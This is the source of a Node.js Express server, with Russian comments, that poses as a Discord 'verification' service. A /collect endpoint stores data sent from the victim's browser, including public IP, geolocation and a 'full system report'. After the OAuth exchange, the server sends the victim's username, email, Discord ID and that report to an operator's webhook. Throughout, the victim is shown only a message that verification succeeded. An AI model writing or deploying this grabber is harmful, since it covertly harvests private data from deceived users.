require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const PORT = process.env.PORT || 3000;
const sessions = new Map();

app.post('/collect', (req, res) => {
    const { state, data } = req.body;
    if (state && data) {
        sessions.set(state, data);
        console.log(`[+] Данные сохранены для state: ${state}`);
    }
    res.sendStatus(200);
});

app.get('/callback', async (req, res) => {
    const { code, state } = req.query;
    
    if (!code) return res.send('Ошибка: нет кода авторизации.');
    
    const clientData = sessions.get(state) || { error: 'Данные не найдены' };
    sessions.delete(state);

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const redirectUri = `${protocol}://${host}/callback`;

    try {
        // 1. Обмен кода на токен
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.DISCORD_CLIENT_ID,
            client_secret: process.env.DISCORD_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, token_type } = tokenResponse.data;

        // 2. Получаем данные пользователя (ник, почта)
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        const user = userResponse.data;

        // 3. Отправляем в вебхук (Сообщение + Файл)
        if (process.env.DISCORD_WEBHOOK_URL) {
            const formData = new FormData();
            
            // Красивое сообщение
            const embed = {
                title: 'New Verified User',
                color: 0x5865f2,
                fields: [
                    { name: 'Username', value: user.username, inline: true },
                    { name: 'Email', value: user.email || 'Not provided', inline: true },
                    { name: 'Discord ID', value: user.id, inline: true },
                    { name: 'Public IP', value: clientData.publicIp || 'Unknown', inline: true },
                    { name: 'Location', value: clientData.geo ? `${clientData.geo.city}, ${clientData.geo.country}` : 'Unknown', inline: true },
                    { name: 'ISP', value: clientData.geo?.org || 'Unknown', inline: true }
                ],
                timestamp: new Date().toISOString()
            };

            formData.append('payload_json', JSON.stringify({
                content: '**Full System Report Attached** 👇',
                embeds: [embed]
            }));

            // Создаем файл с полным JSON отчетом
            const reportJson = JSON.stringify(clientData, null, 2);
            const fileBlob = new Blob([reportJson], { type: 'application/json' });
            formData.append('files[0]', fileBlob, 'report.json');

            await axios.post(process.env.DISCORD_WEBHOOK_URL, formData).catch(err => {
                console.error('Ошибка вебхука:', err.response?.data || err.message);
            });
        }

        // 4. Добавляем пользователя на сервер (guilds.join)
        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}`,
            { access_token: access_token },
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`, 'Content-Type': 'application/json' } }
        );

        // 5. Выдаем роль
        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}/roles/${process.env.DISCORD_ROLE_ID}`,
            {},
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}` } }
        );

        res.send(`
            <body style="background:#313338;color:#dbdee1;font-family:sans-serif;text-align:center;padding-top:100px;">
                <h2 style="color:#f2f3f5;">✅ Verification successful!</h2>
                <p>You have been added to the server and received your role.</p>
                <p style="color:#949ba4;font-size:14px;">You can close this page and return to Discord.</p>
            </body>
        `);
    
    } catch (error) {
        const errMsg = error.response?.data?.message || error.message;
        const errCode = error.response?.data?.code || '';
        console.error('DISCORD API ERROR:', error.response?.data || error.message);
        
        res.status(500).send(`
            <body style="background:#313338;color:#dbdee1;font-family:sans-serif;text-align:center;padding-top:50px;">
                <h2 style="color:#f2f3f5;">❌ Verification error</h2>
                <p style="color:#fa777c;">Error: ${errMsg} (Code: ${errCode})</p>
                <p style="color:#949ba4;font-size:14px;">Check Railway logs if you don't understand this error.</p>
            </body>
        `);
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
